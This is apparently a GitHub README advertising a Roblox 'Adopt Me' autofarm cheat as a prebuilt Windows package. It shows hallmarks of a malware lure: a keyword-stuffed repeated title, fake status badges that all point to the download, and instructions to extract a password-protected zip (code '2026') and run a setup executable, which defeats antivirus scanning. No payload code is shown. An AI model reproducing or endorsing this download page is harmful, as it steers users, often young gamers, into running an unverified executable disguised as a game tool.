<div align="center">

# Adopt Me AutoFarm — Adopt Me AutoFarm — Adopt Me Autofarm (One-Command Setup, Prebuilt Release)

<p><strong>Adopt Me AutoFarm — Adopt Me AutoFarm — Adopt Me Autofarm (One-Command Setup, Prebuilt Release): Adopt Me AutoFarm — adopt-me and autofarm in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/adopt-me-helper-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/adopt-me-helper-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/adopt-me-helper-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/adopt-me-helper?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/adopt-me-helper-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download adopt-me-helper-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/adopt-me-helper-v0.1.0-win64.zip"><img src="banner.svg" alt="Adopt Me AutoFarm Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Adopt Me AutoFarm — Adopt Me AutoFarm — adopt-me and autofarm in one tool** (`adopt-me-helper`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`adopt-me-helper-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/adopt-me-helper-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`adopt-me-helper-v0.1.0-win64.zip`](../../releases/download/v0.1.0/adopt-me-helper-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `AdoptMeHelper_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Documentation & Guides

- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/adopt-me-helper.git
cd adopt-me-helper
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: adopt-me-helper, roblox, autofarm, pets, quests, money, gaming-tools, automation, adopt-me, cli, developer-tools, open-source, windows, productivity, cpp, portable, prebuilt, tools</sub>
